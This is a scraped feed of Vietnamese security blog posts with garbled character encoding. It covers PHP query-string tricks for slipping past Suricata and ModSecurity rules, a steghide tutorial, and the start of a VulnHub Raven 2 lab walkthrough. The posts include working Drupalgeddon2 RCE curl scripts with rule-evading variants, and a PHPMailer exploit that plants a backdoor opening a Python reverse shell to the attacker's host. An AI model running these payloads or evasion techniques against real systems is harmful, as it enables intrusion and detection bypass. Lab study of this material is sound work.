th·ªùi gian th·ª±c (IDS), h·ªá th·ªëng ngƒÉn ng·ª´a x√¢m nh·∫≠p (IPS), gi√°m s√°t an ninh m·∫°ng (NSM) v√† x·ª≠ l√Ω pcap ngo·∫°i tuy·∫øn.\n  V·ªõi Suricata, b·∫°n c√≥ th·ªÉ vi·∫øt 1 rule ki·ªÉm tra HTTP traffic. Gi·∫£ s·ª≠ b·∫°n vi·∫øt 1 rule:\n1 2 3 4 5 6  alert http any any -\u0026gt; $HOME_NET any (\\  msg: \u0026#34;Block SQLi\u0026#34;; flow:established,to_server;\\  content: \u0026#34;POST\u0026#34;; http_method;\\  pcre: \u0026#34;/news_id=[^0-9]+/Pi\u0026#34;;\\  sid:1234567;\\ )     Rule ki·ªÉm tra n·∫øu news_id c√≥ m·ªôt gi√° tr·ªã kh√¥ng ph·∫£i l√† s·ªë. Trong PHP n√≥ c√≥ th·ªÉ d·ªÖ d√†ng bypass s·ª≠ d·ª•ng tr√¨nh ph√¢n t√≠ch c√∫ ph√°p chu·ªói truy v·∫•n c·ªßa n√≥, gi·ªëng nh∆∞ v√†i v√≠ d·ª• sau ƒë√¢y:\n  T√¨m ki·∫øm tr√™n google v√† github, t√¥i t√¨m th·∫•y r·∫±ng c√≥ nhi·ªÅu quy t·∫Øc Suricata cho PHP c√≥ th·ªÉ ƒë∆∞·ª£c b·ªè qua b·∫±ng c√°ch thay th·∫ø d·∫•u g·∫°ch d∆∞·ªõi, th√™m byte r·ªóng ho·∫∑c kho·∫£ng tr·∫Øng trong t√™n ƒë·ªëi s·ªë ƒë∆∞·ª£c ki·ªÉm tra. M·ªôt v√≠ d·ª• th·ª±c t·∫ø:   Nh∆∞ ch√∫ng ta ƒë√£ th·∫•y, n√≥ c√≥ th·ªÉ b·ªè qua b·ªüi\n1  /view.php?i%00=1\u0026amp;%20key=d3b07384d113edec49eaa6238ad5ff00     C√≥ th·ªÉ thay v·ªã tr√≠ ƒë·ªëi s·ªë nh∆∞\n1  /view.php?key=d3b07384d113edec49eaa6238ad5ff00\u0026amp;i=1     WAF (ModSecurity)  PHP query string paser c≈©ng c√≥ th·ªÉ b·ªã s·ª≠ d·ª•ng ƒë·ªÉ b·ªè qua c√°c quy t·∫Øc c·ªßa WAF. H√£y t∆∞·ªüng t∆∞·ª£ng m·ªôt quy t·∫Øc ModSecurty nh∆∞ SecRule! !ARGS:news_id \u0026quot;@rx ^[0-9]+$\u0026quot; \u0026quot;block\u0026quot; thi√™n v·ªÅ bypass technique. May m·∫Øn thay, trong ModSecurity b·∫°n ch·ªâ c√≥ th·ªÉ ch·ªâ ƒë·ªãnh 1 query string b·∫±ng m·ªôt REGEX. V√≠ d·ª•: 1  SecRule !ARGS:/news.id/ \u0026#34;@rx ^[0-9]+$\u0026#34; \u0026#34;block\u0026#34;   ƒêi·ªÅu n√†y s·∫Ω ch·∫∑n c√°c y√™u c·∫ßu sau:  PoC || GTFO  B√¢y gi·ªù t√¥i c√≥ th·ªÉ t·∫°o PoC v·ªõi Suricata v√† Drupal CMS v·ªõi exploit CVE-2018-7600 (Drupalgeddon2 Remote Code Execution). ƒê·ªÉ ƒë∆°n gi·∫£n h∆°n, t√¥i s·∫Ω ch·∫°y Suricata v√† Drupal tr√™n 2 con container docker v√† t√¥i s·∫Ω c·ªë g·∫Øng khai th√°c Drupal t·ª´ container Suricata. T√¥i s·∫Ω active 2 rules b√™n Suricata:  A custom rule that blocks form_id=user_register_form A Positive Technologies Suricata rule for CVE-2018-7600    ƒê·ªÉ c√†i ƒë·∫∑t Suricata, t√¥i ƒë√£ l√†m theo h∆∞·ªõng d·∫´n ·ªü tr√™n trang ch·ªß, v√† ƒë·ªëi v·ªõi Drupal, t√¥i ƒë√£ ch·∫°y vulhub m√† b·∫°n c√≥ th·ªÉ clone ·ªü ƒë√¢y: Vulhub Drupal   Ok r·ªìi, t·∫•t c·∫£ ƒë√£ xong, gi·ªù m√¨nh c√≥ th·ªÉ s·ª≠ d·ª•ng exploit CVE-2018-7600. T√¥i mu·ªën t·∫°o m·ªôt s·ªë bash script m√† th·ª±c hi·ªán curl, v√≠ d·ª•: 1 2 3 4 5 6 7  #!/bin/bash  URL=\u0026#34;/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#34; QSTRING=\u0026#34;form_id=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[#post_render][]=exec\u0026amp;mail[#type]=markup\u0026amp;mail[#markup]=\u0026#34; COMMAND=\u0026#34;id\u0026#34; curl -v -d \u0026#34;${QSTRING}${COMMAND}\u0026#34; \u0026#34;http://172.17.0.1:8080$URL\u0026#34;   Nh∆∞ b·∫°n c√≥ th·ªÉ th·∫•y, ƒëo·∫°n script tr√™n th·ª±c thi l·ªánh \u0026ldquo;id\u0026rdquo;. Th·ª≠ n√≥ xem n√†o  N√†o, b√¢y gi·ªù th·ª≠ import 2 rules v√†o Suricata. T√¥i ƒë√£ vi·∫øt c√°i ƒë·∫ßu ti√™n, v√† n√≥ c·ªë g·∫Øng kh·ªõp form_id=user_register_form v√†o b√™n trong 1 request body. C·ªë g·∫Øng vi·∫øt 1 c√°i th·ª© 2 /user/register trong request URL v√† n√≥ tr√¥ng gi·ªëng nh∆∞ #post_render trong request body. My rule:   PT rule:    Sau ƒë√≥ restart Suricata, t√¥i ƒë√£ s·∫µn sang ƒë·ªÉ khai kh√°c xem li·ªáu 2 quy t·∫Øc tr√™n c√≥ ch·∫∑n ƒë∆∞·ª£c vi·ªác khai th√°c c·ªßa t√¥i kh√¥ng.   √öi tr·ªùi, t√¥i ƒë√£ c√≥ 2 b·∫£n ghi Suricata:\n ATTACK [PTsecurity] Drupalgeddon2 \u0026lt;8.3.9 \u0026lt;8.4.6 \u0026lt;8.5.1 RCE through registration form (CVE-2018-7600) [Priority: 1] {PROTO:006} 172.17.0.6:51702 -\u0026gt; 172.17.0.1:8080 Possible Drupalgeddon2 attack [Priority: 3] {PROTO:006} 172.17.0.6:51702 -\u0026gt; 172.17.0.1:    Bypass all the things!  C·∫£ 2 quy t·∫Øc n√†y d·ªÖ d√†ng ƒë·ªÉ bypass. T√¥i ƒë√£ th·∫•y ƒë∆∞·ª£c l√†m th·∫ø n√†o ƒë·ªÉ bypass rule c·ªßa t√¥i v·ªõi vi·ªác l·∫°m d·ª•ng PHP query string parser. T√¥i c√≥ th·ªÉ thay th·∫ø form_id=user_register_form b·∫±ng m·ªôt v√†i th·ª© kh√°c nh∆∞: 1  form%5bid=user_register_form    Nh∆∞ b·∫°n c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c, ch·ªâ c√≥ quy t·∫Øc PT l√† ph√π h·ª£p. Ph√¢n t√≠ch PT, ch√∫ng ta th·∫•y r·∫±ng n√≥ kh·ªõp v·ªõi # v√† phi√™n b·∫£n ƒë∆∞·ª£c m√£ h√≥a %23. Ch√∫ng ta ch·ªâ c√≥ th·ªÉ bypass b·∫±ng c√°ch s·ª≠ d·ª•ng post%5frender thay v√¨ post_render.  C·∫£ 2 rules ƒë√£ ƒë∆∞·ª£c b·ªè qua b·ªüi exploit sau: 1 2 3 4 5 6 7  #!/bin/bash  URL=\u0026#34;/user/register?element_parents=account/mail/%23value\u0026amp;ajax_form=1\u0026amp;_wrapper_format=drupal_ajax\u0026#34; QSTRING=\u0026#34;form%5bid=user_register_form\u0026amp;_drupal_ajax=1\u0026amp;mail[#post%5frender][]=exec\u0026amp;mail[#type]=markup\u0026amp;mail[#markup]=\u0026#34; COMMAND=\u0026#34;id\u0026#34; curl -v -d \u0026#34;${QSTRING}${COMMAND}\u0026#34; \u0026#34;http://172.17.0.1:8080$URL\u0026#34;     T·ªïng k·∫øt  N·∫øu c√°c b·∫°n c·∫£m th·∫•y b√†i vi·∫øt hay v√† c√≥ √≠ch, m√¨nh xin 1 upvote v√† 1 share nh√© :D Ngu·ªìn: https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/  ","permalink":"https://minhtuanact.ml/posts/su-dung-php-query-string-parser-de-qua-mat-ids-ips-va-waf/","summary":"M·ªü ƒë·∫ßu  Nh∆∞ b·∫°n ƒë√£ bi·∫øt, PHP converts query string (trong URL ho·∫∑c body) th√†nh m·ªôt m·∫£ng b√™n trong $_GET ho·∫∑c $_POST. V√≠ d·ª•: /?foo=bar s·∫Ω tr·ªü th√†nh Array([foo] =\u0026gt; \u0026quot;bar\u0026quot;). Query string parsing s·∫Ω lo·∫°i b·ªè ho·∫∑c thay th·∫ø m·ªôt s·ªë k√Ω t·ª± trong t√™n ƒë·ªëi s·ªë b·∫±ng d·∫•u g·∫°ch d∆∞·ªõi. V√≠ d·ª•: /?%20news[id%00=42 s·∫Ω ƒë∆∞·ª£c chuy·ªÉn th√†nh Array([news_id] =\u0026gt; 42). N·∫øu IDS/IPS ho·∫∑c WAF c√≥ rules ch·∫∑n ho·∫∑c ghi nh·∫≠t k√Ω c√°c gi√° tr·ªã kh√¥ng ph·∫£i l√† s·ªë trong tham s·ªë news_id th√¨ c√≥ th·ªÉ b·ªè qua b·∫±ng c√°ch s·ª≠ d·ª•ng parsing process v·ªõi n·ªôi dung nh∆∞ sau: 1  /news.","title":"S·ª≠ d·ª•ng PHP query string parser ƒë·ªÉ qua m·∫∑t IDS, IPS v√† WAF"},{"content":"M·ªü ƒë·∫ßu  Steganography l√† m·ªôt ngh·ªá thu·∫≠t che gi·∫•u th√¥ng tin trong m·∫Øt ng∆∞·ªùi b√¨nh th∆∞·ªùng. ·ªû ƒë√¢y, m√¨nh s·∫Ω h∆∞·ªõng d·∫´n ch·ªâ cho b·∫°n c√°ch s·ª≠ d·ª•ng Steghide - m·ªôt c√¥ng c·ª• terminal r·∫•t ƒë∆°n gi·∫£n ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ l√†m vi·ªác ƒë√≥. M√¨nh s·∫Ω gi·∫£i th√≠ch v·ªÅ kh√°i ni·ªám ƒë·ªÉ b·∫°n hi·ªÉu v·ªÅ nh·ªØng g√¨ ƒëang x·∫£y ra ·ªü trong t·∫≠p tin. ƒê√¢y l√† m·ªôt c√¥ng c·ª• ƒë∆°n gi·∫£n, c√≥ th·ªÉ c·∫•u h√¨nh v√† ch·ªâ m√¢t v√†i gi√¢y ƒë·ªÉ ·∫©n th√¥ng tin trong nhi·ªÅu lo·∫°i t·ªáp kh√°c nhau.  Kh√°i ni·ªám  Kh√¥ng gi·ªëng nh∆∞ m√£ h√≥a, ƒë·ªÉ ·∫©n m·ªôt tin nh·∫Øn, steganography nh√∫ng d·ªØ li·ªáu trong m·ªôt khung h√¨nh, trong m·ªôt t·ªáp h√¨nh ·∫£nh. ƒê·ªëi v·ªõi nh·ªØng ng∆∞·ªùi xem ·∫£nh b√¨nh th∆∞·ªùng, h·ªç s·∫Ω k bi·∫øt r·∫±ng b·ª©c ·∫£nh ƒë·∫•y ƒëang ch·ª©a d·ªØ li·ªáu ƒë∆∞·ª£c ·∫©n ·ªü trong ƒë√≥. B·ª©c ·∫£nh ƒë√≥ tr√¥ng gi·ªëng nh∆∞ nh·ªØng b·ª©c ·∫£nh b√¨nh th∆∞·ªùng kh√°c, r·∫•t kh√≥ c√≥ th·ªÉ ph√°t hi·ªán ra c√≥ ƒëi·ªÅu g√¨ ƒëang ·∫©n sau n√≥ :D Th·ª±c ch·∫•t Steganography ƒë√£ ƒë∆∞·ª£c con ng∆∞·ªùi bi·∫øt t·ªõi t·ª´ r·∫•t l√¢u r·ªìi. NƒÉm 440 tr∆∞·ªõc c√¥ng nguy√™n, ng∆∞·ªùi Herodotus (Ng∆∞·ªùi Hy L·∫°p xa x∆∞a) ƒë√£ c·∫°o tr·ªçc ƒë·∫ßu c√°c n√¥ l·ªá tin c·∫≠y r·ªìi xƒÉm l√™n ƒë√≥ c√°c th√¥ng ƒëi·ªáp v√† ch·ªù t√≥c m·ªçc l·∫°i. M·ª•c ƒë√≠ch c·ªßa vi·ªác n√†y l√† nh·∫±m g·ª≠i tin ƒëi trong cu·ªôc chi·∫øn tranh gi·ªØa ng∆∞·ªùi Herodotus v√† Persians (Ng∆∞·ªùi Ba T∆∞). Trong c√°c cu·ªôc chi·∫øn tranh th·∫ø gi·ªõi, Steganography c≈©ng ƒë∆∞·ª£c s·ª≠ d·ª•ng. Ng∆∞·ªùi ƒê·ª©c ƒë√£ s·ª≠ d·ª•ng m·ª±c kh√¥ng m√†u ƒë·ªÉ vi·∫øt c√°c d·∫•u ch·∫•m nh·ªè l√™n ph√≠a tr√™n v√† d∆∞·ªõi c√°c ch·ªØ c√°i b·∫±ng c√°ch thay ƒë·ªïi chi·ªÅu cao c√°c ch·ªØ trong ƒëo·∫°n vƒÉn b·∫£n. Trong chi·∫øn tranh th·∫ø gi·ªõi th·ª© nh·∫•t, c√°c t√π nh√¢n c≈©ng s·ª≠ d·ª•ng m√£ Morse ƒë·ªÉ g·ª≠i th∆∞ v·ªÅ nh√† b·∫±ng c√°ch vi·∫øt c√°c d·∫•u ch·∫•m v√† g·∫°ch ngang l√™n c√°c ch·ªØ c√°i i,j,t,f. M·ª•c ƒë√≠ch cu·ªëi c√πng c·ªßa Steganography l√† ·∫©n th√¥ng tin b√≠ m·∫≠t trong c√°c d·ªØ li·ªáu v√¥ h·∫°i ƒë·ªÉ ƒë·ªëi ph∆∞∆°ng kh√¥ng bi·∫øt ƒë·∫øn s·ª± hi·ªán di·ªán c·ªßa ch√∫ng.  Steganography ƒë∆∞·ª£c th·ª±c hi·ªán nh∆∞ th·∫ø n√†o  C√≥ m·ªôt s·ªë k·ªπ thu·∫≠t ƒë·ªÉ ·∫©n d·ªØ li·ªáu trong c√°c t·ªáp b√¨nh th∆∞·ªùng. M·ªôt trong nh·ªØng ph∆∞∆°ng ph√°p ƒë∆∞·ª£c s·ª≠ d·ª•ng r·ªông r√£i nh·∫•t v√† c√≥ l·∫Ω d·ªÖ hi·ªÉu nh·∫•t l√† k·ªπ thu·∫≠t LSB (Least Significant Bit) - k·ªπ thu·∫≠t gi·∫•u tin v√†o bit c√≥ tr·ªçng s·ªë th·∫•p nh·∫•t. K·ªπ thu·∫≠t n√†y thay ƒë·ªïi c√°c bit cu·ªëi c√πng c·ªßa m·ªôt byte ƒë·ªÉ m√£ h√≥a m·ªôt th√¥ng ƒëi·ªáp m√¨nh c·∫ßn gi·∫•u v√†o t·ªáp ƒë√≥. V√≠ d·ª• trong m·ªôt h√¨nh ·∫£nh, h√¨nh ·∫£nh th√¨ ƒë∆∞·ª£c t·∫°o n√™n b·ªüi c√°i pixel c√≥ c√°c gi√° tr·ªã ƒë·ªè, l·ª•c, lam bi·ªÉu th·ªã b·∫±ng 8 bit (1 byte) trong kho·∫£ng t·ª´ 0 - 255 theo s·ªë th·∫≠p ph√¢n ho·∫∑c 00000000 ƒë·∫øn 11111111 ·ªü d·∫°ng nh·ªã ph√¢n. Thay ƒë·ªïi hai bit cu·ªëi c√πng c·ªßa pixel m√†u ƒë·ªè ho√†n to√†n t·ª´ 11111111 th√†nh 11111101 ch·ªâ thay ƒë·ªïi gi√° tr·ªã m√†u ƒë·ªè t·ª´ 255 th√†nh 253, kh√¥ng t·∫°o ra s·ª± thay ƒë·ªïi ƒë√°ng ch√∫ √Ω b·∫±ng m·∫Øt th∆∞·ªùng nh∆∞ng v·∫´n cho ph√©p d·ªØ li·ªáu ƒë∆∞·ª£c m√£ h√≥a v√†o trong h√¨nh ·∫£nh.!   Bi·ªÉu ƒë·ªì n√†y hi·ªÉn th·ªã hai h√¨nh ·∫£nh 4 pixel ·ªü gi√° tr·ªã m√†u v√† ·ªü d∆∞·ªõi d·∫°ng nh·ªã ph√¢n. M·ªói kh·ªëi nh·ªã ph√¢n ƒë·∫°i di·ªán cho gi√° tr·ªã c·ªßa pixel t∆∞∆°ng ·ª©ng. K·ªπ thu·∫≠t LSB quan tr·ªçng nh·∫•t ho·∫°t ƒë·ªông t·ªët cho c√°c media trong ƒë√≥ c√°c gi√° tr·ªã bit thay ƒë·ªïi m·ªôt ch√∫t c≈©ng ch·ªâ thay ƒë·ªïi 1 ch√∫t ch·∫•t l∆∞·ª£ng, b√¨nh th∆∞·ªùng s·∫Ω kh√¥ng ph√°t hi·ªán ra. Nh∆∞ng kh√¥ng t·ªët ƒë·ªëi v·ªõi c√°c vƒÉn b·∫£n ASCII khi thay ƒë·ªïi bit s·∫Ω l√†m thay ƒë·ªïi ch·ªØ hay d·ªØ li·ªáu s·∫Ω chuy·ªÉn th√†nh h√¨nh vu√¥ng, d·ªÖ b·ªã ph√°t hi·ªán.  S·ª≠ d·ª•ng Steganography hi·ªáu qu·∫£  ·ªû ƒë√¢y m√¨nh s·∫Ω gi·ªõi thi·ªáu ƒë·∫øn m·ªôt ph·∫ßn m·ªÅm s·ª≠ d·ª•ng tr√™n Linux c√≥ t√™n l√† steghide. Vi·ªác s·ª≠ d·ª•ng n√≥ r·∫•t d·ªÖ d√†ng. ƒê·ªÉ c√†i ƒë·∫∑t n√≥ ch√∫ng ta s·ª≠ d·ª•ng l·ªánh 1  apt-get install steghide     Nh√∫ng tin   Sau khi c√†i ƒë·∫∑t, l·ªánh ghi ƒë·ªÉ nh√∫ng d·ªØ li·ªáu mu·ªën ·∫©n v√†o 1 t·ªáp tin:\n1  steghide embed -ef secretFile -cf coverFile -sf outputFile -z compr√™ssionLevel -e schema     ember: B·∫≠t option ember\n  -ef: ch·ªâ ƒë·ªãnh ƒë∆∞·ªùng d·∫´n c·ªßa t·ªáp hay d·ªØ li·ªáu m√† b·∫°n mu·ªën ·∫©n.\n  -cf: l√† t·ªáp ch·ª©a d·ªØ li·ªáu ƒë∆∞·ª£c nh√∫ng. Gi·ªõi h·∫°n b·ªüi c√°c t·ªáp BMP, JPEG, WAV v√† AU.\n  -sf: l√† m·ªôt ƒë·ªëi s·ªë t√πy ch·ªçn ch·ªâ ƒë·ªãnh t·ªáp output. N·∫øu kh√¥ng ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh, t·ªáp ƒë∆∞·ª£c nh√∫ng s·∫Ω b·ªã ghi ƒë√® b·ªüi t·ªáp ƒë√£ ƒë∆∞·ª£c nh√∫ng c·ªßa b·∫°n\n  -z: ch·ªâ ƒë·ªãnh m·ª©c n√©n trong kho·∫£ng t·ª´ 1-9. N·∫øu b·∫°n kh√¥ng mu·ªën n√©n t·ªáp c·ªßa m√¨nh, thay v√†o ƒë√≥ b·∫°n h√£y s·ª≠ d·ª•ng -Z\n  -e: ch·ªâ ra lo·∫°i m√£ h√≥a. Steghide h·ªó tr·ª£ m·ªôt lo·∫°t c√°c h·ªá th·ªëng m√£ h√≥a. N·∫øu ƒë·ªëi s·ªë n√†y ƒë∆∞·ª£c b·ªè qua theo m·∫∑c ƒë·ªãnh th√¨ steghide s·∫Ω s·ª≠ d·ª•ng AES-128. N·∫øu b·∫°n kh√¥ng mu·ªën s·ª≠ d·ª•ng m√£ h√≥a, ch·ªâ c·∫ßn g√µ -e no.\n  Trong v√≠ d·ª• c·ªßa m√¨nh, m√¨nh ·∫©n th√¥ng tin b√≠ m·∫≠t tr√™n h√¨nh ·∫£nh c·ªßa m·ªôt con m√®o. M√¨nh kh√¥ng ghi ƒë√® v√†o ·∫£nh g·ªëc v√† kh√¥ng n√©n, v√† kh√¥ng s·ª≠ d·ª•ng m√£ h√≥a.\n1  steghide embed -ef secret.txt -cf StegoCat.jpg -e none -Z     Sau khi ch·∫°y l·ªánh Steghide, b·∫°n ƒë∆∞·ª£c nh·∫Øc ƒë·∫∑t m·∫≠t kh·∫©u ƒë·ªÉ s·ª≠ d·ª•ng tr√≠ch xu·∫•t d·ªØ li·ªáu nh√∫ng sau n√†y. Nh·∫≠p m·∫≠t kh·∫©u v√†o v√† b·∫°n ƒë√£ xong r·ªìi ƒë·∫•y. Ch·ªâ m·∫•t v√†i gi√¢y ƒë·ªÉ ·∫©n d·ªØ li·ªáu c·ªßa b·∫°n ·ªü trong t·ªáp h√¨nh ·∫£nh ho·∫∑c √¢m thanh v·ªõi Steghide.\n   B√™n tr√°i l√† b·ª©c ·∫£nh ch∆∞a ƒë∆∞·ª£c nh√∫ng tin, c√≤n b√™n ph·∫£i l√† ·∫£nh ƒë√£ ƒë∆∞·ª£c nh√∫ng. B·∫°n c√≥ th·∫•y s·ª± kh√°c nhau n√†o gi·ªØa 2 b·ª©c ·∫£nh n√†y kh√¥ng. N·∫øu th·∫•y c√≥ ch·ªó n√†o b·∫•t th∆∞·ªùng th√¨ nh·∫Øn cho m√¨nh bi·∫øt nh√© :D  Tr√≠ch xu·∫•t d·ªØ li·ªáu ·∫©n  Tr√≠ch xu·∫•t d·ªØ li·ªáu ·∫©n t·ª´ m·ªôt h√¨nh ·∫£nh Steganogaphic th·∫≠m ch√≠ c√≤n d·ªÖ d√†ng h∆°n c·∫£ ·∫©n tin :D. S·ª≠ d·ª•ng c√∫ ph√°p sau 1  steghide extract -sf stegoCat.jpg -xf extractSecret.txt    Khi b·∫°n ch·∫°y l·ªánh n√†y, b·∫°n s·∫Ω ƒë∆∞·ª£c nh·∫Øc nh·∫≠p m·∫≠t kh·∫©u m√† b·∫°n ƒë√£ t·∫°o ·ªü tr√™n ƒë·ªÉ tr√≠ch xu·∫•t t·∫≠p tin ·∫©n. S·ª≠ d·ª•ng l·ªánh cat ho·∫∑c b·∫•t c·ª© l·ªánh g√¨ b·∫°n bi·∫øt ƒë·ªÉ ƒë·ªçc n·ªôi dung file extractSecret.txt.  ·∫®n d·ªØ li·ªáu trong h√¨nh ·∫£nh qu√° d·ªÖ d√†ng  ∆Øu ƒëi·ªÉm c·ªßa Steganography l√† b·∫°n c√≥ th·ªÉ ·∫©n d·ªØ li·ªáu kh√° d·ªÖ d√†ng, kh√¥ng l√†m thay ƒë·ªïi nhi·ªÅu ch·∫•t l∆∞·ª£ng h√¨nh ·∫£nh ho·∫∑c √¢m thanh. S·ª≠ d·ª•ng steghide c≈©ng r·∫•t ƒë∆°n gi·∫£n v√† nhanh ch√≥ng. C·∫£m ∆°n b·∫°n ƒë√£ ƒë·ªçc v√† n·∫øu c√≥ c√¢u h·ªèi n√†o cho m√¨nh, h√£y comment b√™n d∆∞·ªõi nh√©. :thankyou:  ","permalink":"https://minhtuanact.ml/posts/cach-an-du-lieu-bi-mat-trong-tep-hinh-anh-hoac-am-thanh-chi-mat-vai-giay-va-vo-cung-an-toan/","summary":"M·ªü ƒë·∫ßu  Steganography l√† m·ªôt ngh·ªá thu·∫≠t che gi·∫•u th√¥ng tin trong m·∫Øt ng∆∞·ªùi b√¨nh th∆∞·ªùng. ·ªû ƒë√¢y, m√¨nh s·∫Ω h∆∞·ªõng d·∫´n ch·ªâ cho b·∫°n c√°ch s·ª≠ d·ª•ng Steghide - m·ªôt c√¥ng c·ª• terminal r·∫•t ƒë∆°n gi·∫£n ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ l√†m vi·ªác ƒë√≥. M√¨nh s·∫Ω gi·∫£i th√≠ch v·ªÅ kh√°i ni·ªám ƒë·ªÉ b·∫°n hi·ªÉu v·ªÅ nh·ªØng g√¨ ƒëang x·∫£y ra ·ªü trong t·∫≠p tin. ƒê√¢y l√† m·ªôt c√¥ng c·ª• ƒë∆°n gi·∫£n, c√≥ th·ªÉ c·∫•u h√¨nh v√† ch·ªâ m√¢t v√†i gi√¢y ƒë·ªÉ ·∫©n th√¥ng tin trong nhi·ªÅu lo·∫°i t·ªáp kh√°c nhau.","title":"C√°ch ·∫•n d·ªØ li·ªáu b√≠ m·∫≠t trong t·ªáp h√¨nh ·∫£nh ho·∫∑c √¢m thanh ch·ªâ m·∫•t v√†i gi√¢y v√† v√¥ c√πng an to√†n"},{"content":"M·ªü ƒë·∫ßu  D·∫°o n√†y m√¨nh r·∫•t c√≥ h·ª©ng th√∫ v·ªõi m·∫•y b√†i lab tr√™n VulnHub.com. L·∫ßn n√†y l·∫°i l√† m·ªôt b√†i n·ªØa, c√≥ th·ªÉ ch·ªçc ngo√°y kh√° nhi·ªÅu v·∫•n ƒë·ªÅ ·ªü b√†i n√†y. B·∫°n n√†o mu·ªën build l√™n l√†m th·ª≠ th√¨ qua link n√†y Raven: 2 Th√¥i th√¨ b·∫Øt ƒë·∫ßu v√†o chi·∫øn th√¥i. B√†i n√†y c√≥ t·∫•t c·∫£ l√† 4 c·ªù. M√¨nh ƒëi theo h∆∞·ªõng t√¨m l·∫ßn l∆∞·ª£t 4 c·ªù lu√¥n nh√©.  T·∫•n c√¥ng  B·∫Øt ƒë·∫ßu th√¨ v·∫´n c√¥ng vi·ªác quen thu·ªôc qu√©t nmap c√°c th·ª© th√¨ gi·ªëng c√°c b√†i lab tr∆∞·ªõc ƒë√≥ c·ªßa m√¨nh nh√©. Qu√©t ƒë∆∞·ª£c ƒë·ªãa ch·ªâ ip c·ªßa n√≥ l√† http://192.168.19.17/, m·ªü ra xem c√≥ g√¨ kh√¥ng n√†o.   H·ª´m :anguished: ch·∫£ c√≥ g√¨, th√¥i qu√©t xem c√≥ th∆∞ m·ª•c n√†o l√† l·∫° k. Qu√©t b·∫±ng dirb th√¨ c√≥ ch·ªó n√†y c·∫ßn l∆∞u √Ω n√® 1 2 3 4 5  ---- Entering directory: http://192.168.19.17/vendor/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode \u0026#39;-w\u0026#39; if you want to scan it anyway) ---- Entering directory: http://192.168.19.17/wordpress/ ----    Th·ª≠ v√†o http://192.168.19.17/vendor/ th√¨   C·ªù th·ª© nh·∫•t ·ªü /PATH/ nha =))    Sau m·ªôt h·ªìi ƒë·ªçc c√°c file trong /vendor/ th√¨ bi·∫øt ƒë∆∞·ª£c trang n√†y s·ª≠ d·ª•ng PHPMailer phi√™n b·∫£n 5.2.16. C√°c b·∫°n c√≥ th·ªÉ ki·ªÉm tra ·ªü file VERSION ·ªü /vendor/ kia k√¨a :D\n  S·ª≠ d·ª•ng exploit n√†y :D PHPMailer \u0026lt; 5.2.18 - Remote Code Execution (Python)\n  Nh∆∞ng m√† c·∫ßn s·ª≠a sang l·∫°i m·ªôt ch√∫t.\n1 2 3 4 5 6 7 8  target = \u0026#39;http://192.168.19.17/contact.php\u0026#39; backdoor = \u0026#39;/backdoor.php\u0026#39; payload = \u0026#39;\u0026lt;?php system(\\\u0026#39;python -c \u0026#34;\u0026#34;\u0026#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\\\\\u0026#39;192.168.19.100\\\\\\\u0026#39;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\\\\\u0026#34;/bin/sh\\\\\\\u0026#34;,\\\\\\\u0026#34;-i\\\\\\\u0026#34;])\u0026#34;\u0026#34;\u0026#34;\\\u0026#39;); ?\u0026gt;\u0026#39; fields={\u0026#39;action\u0026#39;: \u0026#39;submit\u0026#39;, \u0026#39;name\u0026#39;: payload, \u0026#39;email\u0026#39;: \u0026#39;\u0026#34;minhtuan\\\\\\\u0026#34;-OQueueDirectory=/tmp -X/var/www/html/backdoor.php hacker\\\u0026#34;@gmail.com\u0026#39;, \u0026#39;message\u0026#39;: \u0026#39;Pwned\u0026#39;}     Run l√™n th√¥i. K·∫øt qu·∫£ s·∫Ω nh∆∞ n√†y\n  ·ªû b√™n m√°y m√¨nh m·ªü nc -lvp 4444 r·ªìi qua tr√¨nh duy·ªát v√†o http://192.168.19.17/backdoor.php. Ta ƒë√£ remote ƒë∆∞·ª£c r·ªìi :D\n  Th√™m python -c 'import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)' ƒë·ªçc cho d·ªÖ :D\n  Flag2 n·∫±m ·ªü th∆∞ m·ª•c /var/www/flag2.txt flag2{6a8ed560f0b5358ecf844108048eb337}\n  Ti·∫øp t·ª•c t√¨m ƒë·∫øn flag3. Th·ª±c ra l√† flag3 n√†y m√¨nh t√¨m th·∫•y ƒë·∫ßu ti√™n lu√¥n, tr∆∞·ªõc c·∫£ flag1. C√°c b·∫°n c√≤n nh·ªõ ƒë·∫øn c√°i link http://192.168.19.17/wordpress/  m√† v·ª´a n√£y qu√©t ƒë∆∞·ª£c b·∫±ng dirb kh√¥ng. V√†o trang ƒë·∫•y th√¨ ch∆∞a th·∫•y c√≥ css. Th·ª≠ b·∫•m n√∫t search th√¨ ra link http://raven.local/wordpress/?s=.\n  S·ª≠ d·ª•ng c√¢u l·ªánh terminal sudo echo \u0026quot;192.168.19.17 raven.local\u0026quot; \u0026gt; /etc/hosts r·ªìi v√†o http://raven.local/wordpress.\n   ƒê·∫πp ƒë·∫Ω h∆°n t√Ω r·ªìi. S·ª≠ d·ª•ng wpscan c√≥ s·∫µn tr√™n kali linux ƒë·ªÉ qu√©t xem trang c√≥ d√≠nh g√¨ kh√¥ng. 1 2 3  [+] Upload directory has listing enabled: http://raven.local/wordpress/wp-content/uploads/ | Found By: Direct Access (Aggressive Detection) | Confidence: 100%    Qu√©t th·∫•y trang n√†y kh·∫£ thi t√Ω t√Ω :v, v√†o th√¨ h∆°i b·∫•t ng·ªù x√≠u :v   Flag3 ƒë√¢y r·ªìi. M√¨nh ki·∫øm ƒë∆∞·ª£c v√†i th·ª© n·ªØa :v 1 2 3 4 5 6 7 8 9 10 11 12  [+] michael | Detected By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] steven | Detected By: Author Id Brute Forcing - Author Pattern 